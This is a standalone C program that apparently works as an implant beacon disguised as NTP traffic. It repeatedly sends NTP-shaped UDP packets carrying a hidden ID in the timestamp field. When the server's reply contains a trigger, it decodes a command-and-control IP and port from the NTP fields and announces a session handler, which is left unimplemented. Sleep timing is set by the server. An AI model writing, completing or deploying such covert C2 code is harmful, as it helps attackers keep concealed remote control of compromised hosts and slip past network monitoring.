//#define NTP_SERVER "XXX.XXX.XXX.XXX"
#define NTP_SERVER "127.0.0.1"
//#define NTP_PORT 12345
#define NTP_PORT 123
#define ID 54321

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define NTP_TIMESTAMP_DELTA 2208988800ull

int main() {
    int sock_fd;
    struct sockaddr_in servaddr;
    char buffer[48];
    time_t t;
    unsigned int delta;
    int a;

    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr=inet_addr(NTP_SERVER);
    servaddr.sin_port=htons(NTP_PORT);

    while (1) {
        memset(buffer, 0, 48);
        buffer[0] = 0xe3;

        a = ID;
        delta = (unsigned int)time(NULL) + NTP_TIMESTAMP_DELTA;
        *(unsigned int *)(buffer + 40) = htonl(delta);
        *(unsigned int *)(buffer + 44) = a ^ delta;

        sendto(sock_fd, buffer, 48, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
        recvfrom(sock_fd, buffer, 48, 0, NULL, NULL);

        a = buffer[47] ^ buffer[46] ^ buffer[45] ^ buffer[44];

        if (a) {
            if (fork()) {
                char c2_ip[16];
                sprintf(c2_ip, "%u.%u.%u.%u", buffer[12], buffer[13], buffer[14], buffer[15]);

                printf("Spawning session handler to %s:%d\n", c2_ip, ntohl(*((int*)(buffer + 4))));

                exit(0);

            }
            //continue;
        }

        sleep((2 << (unsigned char)buffer[2]));
    }

    return 0;
}